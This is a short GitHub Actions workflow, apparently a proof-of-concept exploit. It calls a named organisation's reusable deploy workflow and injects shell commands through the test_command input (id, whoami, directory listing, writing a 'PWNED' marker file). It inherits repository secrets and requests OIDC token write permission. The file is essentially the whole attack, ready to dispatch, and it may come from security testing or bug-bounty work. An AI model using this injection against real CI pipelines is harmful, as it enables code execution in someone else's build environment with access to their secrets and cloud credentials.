name: RCE PoC via test_command Injection

on:
  workflow_dispatch:

permissions:
  id-token: write      # पहले वाला fix
  contents: read       # नया add – contents read grant

jobs:
  attack:
    uses: ultimateai/workflows/.github/workflows/deploy-from-branch.yml@main
    permissions:
      id-token: write
      contents: read     # explicit grant for called workflow
    with:
      image_repo: 'dummy/dummy'
      app_squad: 'dummy'
      github_email: 'bot@example.com'
      github_user: 'github-actions-bot'
      k8s_manifests_repo: 'dummy/dummy'
      branch_name: 'main'
      test_command: 'id; whoami; pwd; ls -la /; echo "PWNED" > /tmp/pwned.txt; cat /tmp/pwned.txt'
    secrets:
      inherit
